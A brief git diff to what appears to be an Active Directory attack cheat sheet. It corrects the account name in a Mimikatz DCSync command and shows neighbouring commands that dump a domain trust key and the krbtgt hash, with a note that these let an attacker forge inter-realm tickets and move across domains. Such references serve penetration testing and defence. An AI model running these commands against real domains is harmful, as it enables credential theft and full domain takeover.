@@ -987,7 +987,7 @@ If we get the trust key we can forge an Inter-realm TGT and traverse domains. Th
 Dump the Trust Key:
 ```Invoke-Mimikatz -Command '"lsadump::trust /patch"'```
 OR
-```lsadump::dcsync /domain:ecorp.bcorp.com /user:bcorp$```
+```lsadump::dcsync /domain:ecorp.bcorp.com /user:ecorp$```
 
 Dump the krbtgt:
 ```Invoke-Mimikatz -Command '"lsadump::dcsync /domain:ecorp.bcorp.lab /user:ecorp\krbtgt"'```
